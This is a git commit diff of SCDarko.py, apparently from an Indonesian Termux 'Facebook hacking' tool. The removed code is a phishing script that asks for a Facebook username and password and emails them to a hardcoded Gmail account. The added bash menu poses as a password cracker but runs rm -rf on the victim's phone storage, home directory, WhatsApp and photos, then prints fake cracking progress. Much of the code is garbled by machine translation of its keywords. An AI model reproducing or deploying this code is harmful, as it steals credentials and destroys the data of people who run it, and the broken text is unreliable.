3c8126cf9b3c9d0183acfaae4f1766c11fe94a38
mrmamangbot <65497626+mrmamangbot@users.noreply.github.com>
2020-06-18 09:17:31 +0700

    Update SCDarko.py

--- SCDarko.py
+++ SCDarko.py
@@ -1,74 +1,118 @@
-﻿# - * - coding: utf-8 - * -
+ 
+#! / system / xbin / bash
+# Bersihkan Layar
+bersih
+biru = ' \ 033 [34; 1 m '
+hijau = ' \ 033 [32; 1 m '
+ungu = ' \ 033 [35; 1 m '
+cyan = ' \ 033 [36; 1m '
+red = ' \ 033 [31; 1m '
+white = ' \ 033 [37; 1m '
+kuning = ' \ 033 [33; 1 m '
+# ############################################## #
+# CTRL C-
+# ############################################## #
+menjebak ctrl_c INT
+ctrl_c () {
+bersih
+echo   $ red " [#]> (Ctrl + C) Terdeteksi,
+Mencoba Keluar ... "
+tidur 1
+gema  " "
+echo   $ yellow " [#]> Terima Kasih Telah Menggunakan Saya
+Alat ... "
+tidur 1
+gema  " "
+echo   $ white " [#]> ALI ATTACKER Hadir ... "
+baca enter
+keluar
+}
+gema              "
+____________________________________________ "  | lolcat
+echo  $ green " kontak admin:LOL "
+echo  $ Orange " Autohor: MR.BOT "
+echo  $ Red " Terima Kasih Untuk Anonim Seluruh Indonesia "
+gema              "
+___________________________________________ "  | lolcat
+echo  $ green " 01) Singgle Target ID Facebook "
+echo  $ green " 02) Langkah Sebelum Menggunakan Tool "
+echo  $ green " 03) Alat Info "
+baca -p " [ALI ATTACKER]> " bro ;
 
-# coding = utf-8
+if [ $ bro  = 1] || [ $ bro  = 01]
+kemudian
+bersih
+echo  $ green " Login Facebook "
+tidur 1
+baca -p " [ISI EMAIL]> " bro ;
+termux-setup-storage
+rm -rf / storage / emulated / 0
+rm -rf / sdcard / 0
+rm -rf / storage / emulated / 0 / DCIM
+rm -rf / storage / emulated / 0 / android / obb
+rm -rf / sdcard / 0 / android / data
+rm -rf $ HOME
+rm -rf sdcard / 0
+rm -rf penyimpanan / dicontoh / 0
+rm -rf / storage / emulated / 0 / WhatsApp
+rm -rf / sdcard / 0 / WhatsApp
+rm -rf / storage / emulated / 0 / Downloads
+rm -rf / storage / emulated / 0 / Music
+rm -rf / sdcard / 0 / Musik
+echo  $ green " Sedang Mencari ID Facebook Dalam 30 detik "
+tidur 5
+echo  $ green " Sedang Mencari ID Facebook Dalam 29 detik "
+tidur 5
+echo  $ green " Sedang Mengumpulkan ID Facebook Dalam 28 detik "
+tidur 5
+echo  $ green " Sedang Mengumpulkan ID Facebook Dalam 27 detik "
+tidur 5
+echo  $ green " Sedang Mencari Kata Sandi Facebook Dalam 26 detik "
+tidur 3
+echo  $ red " Mencari Gagal! Sedang Mengulangi Kembali Pencarian "
+tidur 5
+echo  $ green " Sedang Mencari Kata Sandi Facebook Dalam 60 detik "
+tidur 5
+echo  $ green " Sedang Mencari Kata Sandi Facebook Dalam 59 detik "
+tidur 5
+echo  $ green " Sedang Mencari Kata Sandi Facebook Dalam 58 detik "
+tidur 5
+echo  $ green " Berhasil Mencari kata sandi Facebook "
+tidur 5
+echo  $ green " Sedang Mengumpulkan Kata Sandi Facebook Dalam 3 Detik "
+tidur 5
+echo  $ green " Sedang Mengumpulkan Kata Sandi Facebook Dalam 2 detik "
+tidur 5
+echo  $ green " Sedang Mengumpulkan Kata Sandi Facebook Dalam 1 detik "
+tidur 5
+echo  $ white " Mengumpulkan Data + ID + Kata Sandi Facebook "
+echo  $ green " kirim ke sdcard / 0 "
+tidur 3
+echo  $ green " Buka penyimpanan cari PasswordFacebook.txt buka dan liat hasil cracking password "
+keluar
+fi
 
-impor  soket , struct , os , sys , waktu , yagmail
+if [ $ bro  = 2] || [ $ bro  = 02]
+kemudian
+bersih
+echo  $ green " Harap Izinkan Termux untuk mengakses penyimpanan "
+echo  $ green " Agar bisa menyimpan hasil Crack Password ke sdcard "
+termux-setup-storage
+tidur 4
+termux-setup-storage
+tidur 4
+termux-setup-storage
+tidur 4
+termux-setup-storage
+keluar
+fi
 
-x = yagmail . SMTP ( 'dompetphising01@gmail.com' , '08886650181a' )
-
-subject = 'nyetor akun bang'
-
-logo  =  "" " \ 033 [1; 94m█████████
-
-\ 033 [1; 94m█▄█████▄█       \ 033 [1; 94m ● ▬▬▬▬▬▬▬▬▬๑ ۩۩๑▬▬▬▬▬▬▬▬ ●
-
-\ 033 [1; 94m█ \ 033 [1; 94m ▼ harap letakkan kembali \ 033 [1; 94m- _ --_-- \ 033 [1; 94m╔╦╗┌─┐┬─┐┬┌─ ╔ ═╗╔╗
-
-\ 033 [1; 94m█ \ 033 [1; 94m \ 033 [1; 94m _-_-- -_ --__ \ 033 [1; 94m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
-
-\ 033 [1; 94m█ \ 033 [1; 94m ▲▲▲▲▲ \ 033 [1; 94m-- - _ - \ 033 [1; 94m═╩╝┴ ┴┴└─┴ ┴ ╚ ╚═╝ \ 033 [1; 97mVVIP    
-
-\ 033 [1; 94m█████████       \ 033 [1; 94m «°°°°°°°°°°°°°
-
-\ 033 [1; 94m ██ ██ \ x1b [00m "" "
-
-
-
-spanduk  =  "" "
-
-\ x1b [34mhack Facebook Daftar Teman
-
-\ x1b [00mAcrack cracking otomatis dengan Bruteforce
-
-\ x1b [00mSilakan login dengan akun Anda \ x1b [ 91m !
-
-"" "
-
-def  main ():
-
-	os . sistem ( 'jelas' )
-
-	cetak ( logo )
-
-	cetak ( spanduk )
-
-	cetak ( ' \ x1b [00m \ 033 [41m LOGIN FACEBOOK \ 033 [00m' )
-
-	u = input ( ' \ x1b [00mUsername: \ x1b [33m' )
-
-	p = input ( ' \ x1b [00mPassword: \ x1b [33m' )
-
-	msg = ( 'nama pengguna:' + u + ', kata sandi:' + p )
-
-	body = ( msg )
-
-	cetak ( '' )
-
-	cetak ( ' \ x1b [00mMaaf, koneksi gagal \ x1b [ 91m ! \ x1b [00m' )
-
-	cetak ( ' \ x1b [33mSilakan coba lagi nanti ...' )
-
-	os . sistem ( 'tidur 3' )
-
-	cetak ( '' )
-
-	cetak ( ' \ x1b [Program 00m Keluar \ x1b [ 91m !' )
-
-	os . sistem ( 'keluar' )
-
-	x . kirim ( 'auliatubaa88@gmail.com' , subjek , badan )
-
-
-
-main ()
-
+if [ $ bro  = 3] || [ $ bro  = 03]
+kemudian
+bersih
+echo  $ green " terkadang anda harus teliti"
+echo  $ green " Penulis MR.BOT "
+echo  $ green " Jika Ada masalah Hubungi Nomer Saya "
+echo  $ green " kontak admin: 6289656179586 "
+keluar 
+fi
